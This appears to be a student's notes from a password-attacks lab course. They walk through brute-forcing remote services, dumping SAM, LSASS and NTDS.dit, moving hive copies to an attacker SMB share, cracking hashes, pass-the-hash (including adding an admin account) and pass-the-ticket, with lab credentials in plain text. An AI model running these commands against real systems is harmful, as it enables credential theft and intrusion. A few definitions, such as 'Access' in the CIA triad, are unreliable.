## Theory of Protection
CIA Triad
*Confidentiality* 
*Integrity*
*Access*

We keep this balance by ensuring we audit and account (Accounting) for each file, object, and host in our environment; by validating users have correct permissions (Authorization) to view and utilize those items; and ensuring that each user's identity is validated (Authentication) before granting them access to any enterprise resources.

### Authentication
Three main factors for validation 
1. Something you Know (Password)
2. Something you Possess (Keyfob)
3. Something you Are (Fingerprint, Iris)

### Use of Passwords
Passwords are the most common use of authentication. 

## Credential Storage 
### Linux
***/etc/shadows***

|               |                                   |                         |              |              |                     |                        |                      |                    |
| ------------- | --------------------------------- | ----------------------- | ------------ | ------------ | ------------------- | ---------------------- | -------------------- | ------------------ |
| htb-student:  | $y$j9T$3QSBB6CbHEu...SNIP...f8Ms: | 18955:                  | 0:           | 99999:       | 7:                  | :                      | :                    | :                  |
| `<username>`: | `<encrypted password>`:           | `<day of last change>`: | `<min age>`: | `<max age>`: | `<warning period>`: | `<inactivity period>`: | `<expiration date>`: | `<reserved field>` |
`$ <id>``$ <salt>``$ <hashed>`

|**ID**|**Cryptographic Hash Algorithm**|
|---|---|
|`$1$`|[MD5](https://en.wikipedia.org/wiki/MD5)|
|`$2a$`|[Blowfish](https://en.wikipedia.org/wiki/Blowfish_(cipher))|
|`$5$`|[SHA-256](https://en.wikipedia.org/wiki/SHA-2)|
|`$6$`|[SHA-512](https://en.wikipedia.org/wiki/SHA-2)|
|`$sha1$`|[SHA1crypt](https://en.wikipedia.org/wiki/SHA-1)|
|`$y$`|[Yescrypt](https://github.com/openwall/yescrypt)|
|`$gy$`|[Gost-yescrypt](https://www.openwall.com/lists/yescrypt/2019/06/30/1)|
|`$7$`|[Scrypt](https://en.wikipedia.org/wiki/Scrypt)|

### Windows
![[Windows Authentication.png]]
Local interractive logon is preformed by an interraction between WinLogon, LogonUI, The Credential Provider, LSASS, Authentication Processes and SAM/AD.
Authentication packages are dlls that preform authentication checks. 

`Winlogon` is a trusted process responsible for managing security-related user interactions. These include:
- Launching LogonUI to enter passwords at login
- Changing passwords
- Locking and unlocking the workstation

relies on credential providers installed on system to obtain username/pass, located inside DLL files.

#### LSASS
[Local Security Authority Subsystem Service](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service) (`LSASS`) is a collection of many modules and has access to all authentication processes that can be found in `%SystemRoot%\System32\Lsass.exe`.

| **Authentication Packages** | **Description**                                                                                                                                                                                                                                                |
| --------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Lsasrv.dll`                | The LSA Server service both enforces security policies and acts as the security package manager for the LSA. The LSA contains the Negotiate function, which selects either the NTLM or Kerberos protocol after determining which protocol is to be successful. |
| `Msv1_0.dll`                | Authentication package for local machine logons that don't require custom authentication.                                                                                                                                                                      |
| `Samsrv.dll`                | The Security Accounts Manager (SAM) stores local security accounts, enforces locally stored policies, and supports APIs.                                                                                                                                       |
| `Kerberos.dll`              | Security package loaded by the LSA for Kerberos-based authentication on a machine.                                                                                                                                                                             |
| `Netlogon.dll`              | Network-based logon service.                                                                                                                                                                                                                                   |
| `Ntdsa.dll`                 | This library is used to create new records and folders in the Windows registry.                                                                                                                                                                                |
#### SAM Database 
The *Security Account Manager* (`SAM`) is the database file in windows that stores user credentials used to authenticate local and remote users.
User passwords are stored in a `LM` or `NTLM` hash.
`%SystemRoot%/system32/config/SAM`
SYSTEM level permissions are required to view it.

If system is joined to Domain Controller it must first authenticate with DC from the Active Directory Database (`ntds.dit`).  `%SystemRoot%\ntds.dit`

Microsoft introduced a security feature in Windows NT 4.0 to help improve the security of the SAM database against offline software cracking. This is the `SYSKEY` (`syskey.exe`) feature, which, when enabled, partially encrypts the hard disk copy of the SAM file so that the password hash values for all local accounts stored in the SAM are encrypted with a key.

### Credential Manager
![[Pasted image 20241119025220.png]]
### NTDS
Common to come across network environments where windows systems are joined to a windows domain.
Easier for admins to manage all systems owned by their respective orginizations. 
Windows systems will therefore send logon requests to domain controllers that belong to same AD forest. 

Controller hosts a file called `NTDS.dit` that is kept synchronized across all Domain Controllers with the exception of [Read-Only Domain Controllers](https://docs.microsoft.com/en-us/windows/win32/ad/rodc-and-active-directory-schema). NTDS.dit is a database file that stores the data in Active Directory, including but not limited to:

- User accounts (username & password hash)
- Group accounts
- Computer accounts
- Group policy objects

## Network Services 
Most common services for accessing or executing commands on a remote system are: 
- *RDP*
- *WinRM*
- *SSH*

### WinRM
*Windows Remote Management* (`WinRM`) is ms implementation of WS-Management. It is a network protocol based on XML services and *Simple Object Access Protocol* (`SOAP`) used for remote management of windows system. Takes care of the communication between *Web-Based Enterprise Management* (`wbem`) and *Windows Management Instrumentation* (`WMI`) Which we can call the *Distributed Component Object Model* (`DCOM`). 

*Winrm* uses ports `5985` and `5986` and must be turned on manually for security reasons.

### CrackMapExec
```shell-session
crackmapexec winrm 10.129.42.197 -u user.list -p password.list
```
Useful for bruteforcing passwords in winrm, we can then use *Evil-WinRM* to login.

### Evil-WinRM
If the login was successful, a terminal session is initialized using the [Powershell Remoting Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-psrp/602ee78e-9a19-45ad-90fa-bb132b7cecec) (`MS-PSRP`)

### SSH 
SSH is a more secure way to remote connect to a host. Runs on *port* `22`. Uses 3 different types of cryptography operations
#### Symmetric Encryption 
Symetric encryption uses the same key for encryption and decryption. Anyone who has access to the key can also transmit data. Key exchange procedure needed for secure encryption. 

#### Asymmetric Encryption 
Asymmetric encryption uses two keys, public and private key. The private key must remain secret. If an attacker gets the private key then they will be able to log into a system without authentication. 
*Hydra can be used to bruteforce SSH*
```shell-session
 hydra -L user.list -P password.list ssh://10.129.42.197
```

### RDP 
*Remote Desktop Protocol* (`RDP`) is a protocol to access windows systems on *port* `3389`
Provides both admins and users to a windows host within an organisation. 
Defines 2 participants, a *Terminal Server* and *Terminal Client*.
In addition to exchange of Sound, Keyboard, Mouse you can also print or allow access to storage media. 
RDP is an application layer protocol and utilizes UDP and TCP.
*Hydra can be used to bruteforce RDP*
```shell-session
hydra -L user.list -P password.list rdp://10.129.42.197
```

### SMB
*Server Message Block*(`SMB`) is a protocol responsible for transferring data between client and server in a LAN. Used to impliment file sharing, directory sharing and printing services. Compared to NFS for linux. 
SMB aka *Common Internet Files System*(`CIFS`) is part of SMB and allows connections from windows. nix. or mac. 
*Hydra can be used to bruteforce SMB*
```shell-session
hydra -L user.list -P password.list smb://10.129.42.197
```

***HYDRA CANNOT HANDLE SMBV3 REQUESTS. USE METASPLOIT***
```shell-session
auxiliary/scanner/smb/smb_login
```

Once we have the SMB Server credentials cracked
We can use CrackMap again to enumerate SMB shares. 

```shell-session
crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
```

Finally using smbclient to connect to smb shares.

```shell-session
smbclient -U user \\\\10.129.42.197\\SHARENAME
```

cassie:12345678910

## Password Mutations
Hashcat can use specific rule files to create mutations of passwords. 

| **Function** | **Description**                                   |
| ------------ | ------------------------------------------------- |
| `:`          | Do nothing.                                       |
| `l`          | Lowercase all letters.                            |
| `u`          | Uppercase all letters.                            |
| `c`          | Capitalize the first letter and lowercase others. |
| `sXY`        | Replace all instances of X with Y.                |
| `$!`         | Add the exclamation character at the end.         |
***PREBUILT RULESLISTS***
```shell-session
ls /usr/share/hashcat/rules/
```

## Default Passwords. 
https://github.com/ihebski/DefaultCreds-cheat-sheet

## Attacking SAM
With access to non-domain joined Windows systems we may benefit from quickly dumping the SAM database and crack hashes offline.

There are 3 main registry hives which we can dump

|Registry Hive|Description|
|---|---|
|`hklm\sam`|Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.|
|`hklm\system`|Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.|
|`hklm\security`|Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.|
We can use *reg.exe* to save registries
```cmd-session
reg.exe save hklm\sam C:\sam.save
```

Technically we only need `hklm\sam` and `hklm\system` but `hklm\security` can be helpful as it can contain hashes associated with cached domain user credentials. 
```
impacket-smbserver
```

```shell-session
-smb2support CompData /home/ltnbob/Documents/
```

Once we have SMB running we can move saves to local files.

```cmd-session
move security.save \\10.10.15.16\CompData
```

We can dump hashes from the sam with 
```
Impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```

Passwords can then be cracked in hashcat
```shell-session
hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

### Remote Dumping & LSA Secrets Considerations
```shell-session
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

We can also dump hashes from SAM database remotely
```shell-session
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```


## Attacking LSASS
*Local Security Authorization Subsystem Service* 
Upon initial logon, LSASS will:
- Cache credentials locally in memory
- Create [access tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
- Enforce security policies
- Write to Windows [security log](https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)

### Dumping LSASS Process Memory 
Dumping process memory lets us extract credentials offline. 

#### Task Manager Method
`Open Task Manager` > `Select the Processes tab` > `Find & right click the Local Security Authority Process` > `Select Create dump file`
![[LSASS_taskmanager_dump.png]]
A file called ***lsass.DMP*** is then saved in: 
```cmd-session
C:\Users\loggedonusersdirectory\AppData\Local\Temp
```

#### Rundll32.exe and Comsvcs.exe Method
Task manager is dependent on GUI session with target 

*Modern antivirus recognize this as malicious activity* 

Before issuing command to create dump file we first need to find process ID
We can find this with:
```
CMD:
tasklist /svc
PS:
Get-Process lsass
```

```powershell-session
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

With this command we are running `rundll32` to call an exported function in `comsvcs.dll` which calls `MiniDump` to dump the lssas process `672` to a specific directory.

#### Using PyPyKatz to Extract Credentials
PyPyKatz is like mimikatz but python. Mimikatz is a password extractor that extracts LSASS from memory.
```shell-session
pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
```
##### Output .
==MSV== 
Authentication package in windows that LSA calls on validate login attempts against SAM database.
PyPyKatz extracts `SID`, `Username` , `Domain`, `NT` and `Sha1` password hashes associated with user in login memory.

==WDIGEST==
WDIGEST is an older authentication protocol enabled by default in *Windows XP* - *Windows 8* and *Windows Server 2003* - *Windows Server 2012*.
LSASS caches credentials used in WDIGEST in clear text. 
Disabled by default and windows security note suggests turning it off.

##### Kerberos
Network auth protocol used by *ActiveDirectory* in windows. Grants Tickets upon authentication.
Tickets used to exchange for access to network resources so user doesn't have to re-authenticate
LSASS `caches passwords`, `ekeys`, `tickets`, and `pins` associated with Kerberos.

##### DPAPI
*Data Protection Application Programming Interface* set of APIs in windows used to encrypt and decrypt DPAPI data blobs on a per user basis for Windows OS features and various third-party applications.

| Applications                | Use of DPAPI                                                                                |
| --------------------------- | ------------------------------------------------------------------------------------------- |
| `Internet Explorer`         | Password form auto-completion data (username and password for saved sites).                 |
| `Google Chrome`             | Password form auto-completion data (username and password for saved sites).                 |
| `Outlook`                   | Passwords for email accounts.                                                               |
| `Remote Desktop Connection` | Saved credentials for connections to remote machines.                                       |
| `Credential Manager`        | Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more. |

`MimiKatz` and `pypykatz` can extract the *DPAPI* master key which is used to decrypt the secrets ascociated with the applications using *DPAPI*. 

##### Cracking the NT Hash with Hashcat
```shell-session
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

## Attacking Active Directory & NTDS.dit
*Active Directory* (`AD`) is a critical service in modern enterprise networks. If an organization uses windows. We can dump hashes from `NTDS.dit` file. 
Possible a company is using RDP on an edge router to a system on their internal network.

Once a Windows system is joined to a network it will no longer use *SAM* database to validate credentials. Domain joined system will now send all requests to AD server. 

Still possible to logon using the *SAM* credentials by specifying hostname followed by username eg: (`WS01/username)` or direct access to the device with ./ in the username field.

https://attack.mitre.org/techniques/T1003/003/

### Dictionary Attacks against AD accounts with CrackMapExec
If we find ourselves in a position where a dictionary attack is a valid option we can try to custom tailor our attack as much as possible. 

Organizations will often use mutations of Firstname/Lastname 

|Username Convention|Practical Example for Jane Jill Doe|
|---|---|
|`firstinitiallastname`|jdoe|
|`firstinitialmiddleinitiallastname`|jjdoe|
|`firstnamelastname`|janedoe|
|`firstname.lastname`|jane.doe|
|`lastname.firstname`|doe.jane|
|`nickname`|doedoehacksstuff|
We can also find the username schema by tryingto find company emails. 
From the email address `jdoe`@`inlanefreight.com`, we see that `jdoe` is the username.

Sometimes you can use google dorks to search for “inlanefreight.com filetype:pdf” and find some valid usernames in the PDF properties if they were generated using a graphics editor.

Username Anarchy can be used to create mutations of names.

#### CrackMapExe 
```shell-session
crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

This will generate a log for each login attempt, generating possibly millions of logs. 

### Capturing NTDS.dit
`NT Directory Services` (`NTDS`) is the directory service used with AD to find & organize network resources. Recall that `NTDS.dit` file is stored at `%systemroot%/ntds` on the domain controllers in a [forest](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model).
.dit stands for *directory information tree*. 
If this account can be captured its possible to compromise every account on the domain. 

We need to connect to a AD server with evil-winrm

Once connected we can check privileges 
```shell-session
net localgroup
```

If an account has  ***local admin*** (`Administrators`) or ***Domain Admins*** (`Domain Admins`) 
```shell-session
net user username
```

### Creating Shadow Copy of C:
we can use vssadmin to create a *volume shadow copy*(`vss`) of the C: drive we use vss for this because its designed to make copies of volumes that can be read/written.

Vss is used to create backups for disaster recovery software and to perform operations. 
```shell-session
vssadmin CREATE SHADOW /For=C:
```

```shell-session
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```
We can then move the copy of NTDS to our SMB server. 

### Faster Method CrackMapExec to capture NTDS.dit
we can use crackmap to quickly accomplish the same task. 
```shell-session
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

### Pass the Hash Considerations 
We can use hashes in a `PtH` attack to authenticate a user without the plain-text password. 
```shell-session
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```

## Credential Hunting in Windows
We need to put our minds into the minds of an admin and find what we would do on a day to day basis 

|   |   |   |
|---|---|---|
|Passwords|Passphrases|Keys|
|Username|User account|Creds|
|Users|Passkeys|Passphrases|
|configuration|dbcredential|dbpassword|
|pwd|Login|Credentials|

We can use different tools to enumerate the system to look for keywords. 

Windows Search
https://github.com/AlessandroZ/LaZagne
findstr:
```cmd-session
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

## Credential Hunting in Linux
|**`Files`**|**`History`**|**`Memory`**|**`Key-Rings`**|
|---|---|---|---|
|Configs|Logs|Cache|Browser stored credentials|
|Databases|Command-line History|In-memory Processing||
|Notes||||
|Scripts||||
|Source codes||||
|Cronjobs||||
|SSH Keys|||
### Files
Look for config files 
```shell-session
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```
```shell-session
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```
```shell-session
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```
```shell-session
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```
```shell-session
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```
### Cronjobs
```shell-session
cat /etc/crontab
```
### SSH Keys
```shell-session
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```
```shell-session
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```
### Bash History
```shell-session
tail -n5 /home/*/.bash*
```
### Logs
```shell-session
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```
### Lazagne or Mimipenguin
### Firefox Decrypt
https://github.com/unode/firefox_decrypt

## passwd/shadow
```shell-session
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```
```shell-session
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

## Pass the Hash
attacker uses password hash instead of plain text password for authentication. 

### Windows
[Windows New Technology LAN Manager (NTLM)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview)  is a set of protocols which authenticates users whilst protecting integrity and confidentiality of their data.
Single Sign on solution that uses a challenge-response protocol to verify user's identity without them providing a password.

NLTM still supported but kerberos has taken over as default authentication mechanism.

### PTH Windows with Mimikatz
Mimikatz has a module named `sekurlsa::pth`
*Local Admin Needed*
- `/user` - The user name we want to impersonate.
- `/rc4` or `/NTLM` - NTLM hash of the user's password.
- `/domain` - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
- `/run` - The program we want to run with the user's context (if not specified, it will launch cmd.exe).
```cmd-session
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```


##### Dumping hashes
```cmd
privilege::debug
sekurlsa::logonpasswords
```
### Invoke-The-Hash
[Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) powerful set of powershell functions to preform pass-the-hash to WMI and SMB. 
Authentication is via passing a NLTM hash into a NLTMv2 Authentication protocol. 
*Local Admin not needed, but required on target machine*
To use this tool, we need to specify the following parameters to execute commands in the target computer:

- `Target` - Hostname or IP address of the target.
- `Username` - Username to use for authentication.
- `Domain` - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
- `Hash` - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
- `Command` - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.
```powershell-session
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```
We can then feed a reverse shell into this.

### PTH with Impacket
We can use psexec to preform this attack
```shell-session
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```
We can also use
- impacket-wmiexec
- impacket-atexec
- impacket-smbexec

### PTH with CrackMapExec
Crackmap is a post exploitation tool to help automatically assess security of large AD hosts.
Crackmap can password spray and attempt to authenticate using a hash to some or all hosts on the network. Possible to lock out domain accounts so keep target lockout policy in mind.
```shell-session
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```
If we want to use the local admins password hash we can add `--local-auth`

### PTH with evil-winrm
```shell-session
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

### PTH with RDP
We can preform PTH with xfreerdp
Restricted admin mode must be enabled on machine otherwise will be presented with following error.
`Account Restrictions are preventing the user from signing in.`
This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0.
```cmd-session
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```shell-session
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

### UAC limits
UAC limits local user's ability to perform remote administration operations. 
When the registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.


## Pass the Ticket - Windows
### Kerebros Protocol Refresher
Kerebros Auth system is ticket based. The central idea is to not give a password to every app you use but to instead keep track of tickets. Using specific tickets only for specific services. 
- The `TGT - Ticket Granting Ticket` is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or `TGS`.
- The `TGS - Ticket Granting Service` is requested by users who want to use a service. These tickets allow services to verify the user's identity.

*Requires local admin*
### Harvesting Kerberos Tickets from Windows
Tickets processes and stored with LSASS.
`Mimikatz` module `sekurlsa::tickets /export`
The tickets that end with `$` correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user's name, followed by an `@` that separates the service name and the domain, for example: `[randomvalue]-username@service-domain.local.kirbi`.

*Pass the Key*
The pass the key approach converts a hash for a domain joined user into a full `Ticket-Granting-Ticket`. 

To Forge tickets we need user's hash.  `sekurlsa::ekeys`

With both we can perform a PTT
```cmd-session
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```
```cmd-session
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```
##### Reubeus 
```cmd-session
Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

## PTT from Linux
Not a requirement to be joined into the domain to use Kerberos tickets on Linux. 
Use same process of `TGT` and `TGS`.

##### Check if Linux is domain joined
```shell-session
realm list
```
```shell-session
ps -ef | grep -i "winbind\|sssd"
```
##### Search for Kerberos Tickets
```shell-session
find / -name *keytab* -ls 2>/dev/null
```
```shell-session
env | grep -i krb5
```

### Abusing Keytab Files
Once we find Keytab files, we can impersonate a user with `kinit`.
```shell-session
klist
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
```

https://github.com/sosdave/KeyTabExtract
```shell-session
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
```

## Protected Files
Use of file encryption still lacking in private and business matters. Emails containing job applications, account statements, or contracts are often sent unencrypted. 

### Hunting for files
```shell-session
for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

### SSH Keys
```shell-session
grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
```

### Encrypted SSH Keys
```shell-session
cat /home/cry0l1t3/.ssh/SSH.private
```

### JTR
```shell-session
locate *2john*
```
### Cracking Documents
#### Cracking MS Office
```shell-session
office2john.py Protected.docx > protected-docx.hash
```
#### Cracking PDF
```shell-session
pdf2john.py PDF.pdf > pdf.hash
```

## Protected Archives
```shell-session
zip2john ZIP.zip > zip.hash
```

#### OpenSSL with Gzip
```shell-session
for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
```

#### Bitlocker
```shell-session
 bitlocker2john -i Backup.vhd > backup.hashes
 grep "bitlocker\$0" backup.hashes > backup.hash
 cat backup.hash
```

